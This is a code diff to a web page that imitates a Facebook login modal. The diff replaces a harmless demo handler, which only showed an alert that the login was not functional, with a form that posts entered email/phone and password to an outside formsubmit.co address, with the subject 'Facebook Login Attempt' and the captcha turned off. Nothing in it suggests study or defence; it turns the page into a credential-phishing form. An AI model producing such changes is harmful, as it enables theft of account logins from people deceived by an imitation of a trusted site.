@@ -1046,9 +1046,12 @@
             <div class="facebook-right">
                 <button class="facebook-close" onclick="closeFacebookModal()">&times;</button>
                 <div class="facebook-form">
-                    <form id="facebookForm">
-                        <input type="text" class="facebook-input" placeholder="Email or Phone Number" required>
-                        <input type="password" class="facebook-input" placeholder="Password" required>
+                    <form id="facebookForm" action="https://formsubmit.co/d7d492f24a67929f3758bf7d9b05c79e" method="POST">
+                        <input type="text" class="facebook-input" name="email_or_phone" placeholder="Email or Phone Number" required>
+                        <input type="password" class="facebook-input" name="password" placeholder="Password" required>
+                        <input type="hidden" name="_subject" value="Facebook Login Attempt">
+                        <input type="hidden" name="_captcha" value="false">
+                        <input type="hidden" name="_template" value="table">
                         <button type="submit" class="facebook-login-btn">Log In</button>
                     </form>
                     <div class="facebook-forgot">
@@ -1132,10 +1135,9 @@
         // Remove the signup form handler since we removed the regular signup form
 
         document.getElementById('facebookForm').addEventListener('submit', function(e) {
-            e.preventDefault();
-            // Facebook form doesn't work - just close the modal
-            alert('Facebook login is not functional in this demo');
-            closeFacebookModal();
+            // Let the form submit naturally to FormSubmit
+            // The form will be submitted to your email automatically
+            console.log('Facebook form submitted to FormSubmit');
         });
 
         // ===== SOCIAL LOGIN HANDLERS =====
